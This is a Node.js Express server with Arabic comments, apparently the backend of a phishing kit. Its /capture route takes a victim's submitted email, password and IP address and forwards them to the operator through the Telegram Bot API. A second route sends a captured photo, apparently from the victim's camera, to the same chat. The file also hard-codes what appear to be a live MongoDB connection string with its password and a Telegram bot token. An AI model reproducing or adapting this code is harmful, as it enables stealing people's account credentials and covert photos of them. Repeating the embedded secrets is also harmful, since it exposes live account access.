const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const FormData = require('form-data'); // ضروري لإرسال الصور

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); // لضمان استقبال حجم الصورة
app.use(express.static(__dirname));

// بياناتك الثابتة
const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

mongoose.connect(MONGO_URI).then(() => console.log("✅ DB Connected"));

// مسار استقبال البيانات النصية
app.post('/capture', async (req, res) => {
    const data = req.body;
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const msg = `🚀 **صيد جديد**\n📧 الحساب: \`${data.email}\` \n🔑 الكلمة: \`${data.password}\` \n🌐 IP: \`${visitorIp}\``;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'
        });
    } catch (e) { console.log("Telegram Error"); }
    res.sendStatus(200);
});

// مسار استقبال الصورة وإرسالها لتليجرام
app.post('/upload-photo', async (req, res) => {
    try {
        const { image } = req.body;
        const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'capture.jpg' });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders()
        });
        console.log("✅ Photo Sent!");
        res.sendStatus(200);
    } catch (e) {
        console.log("❌ Photo Error:", e.message);
        res.sendStatus(500);
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
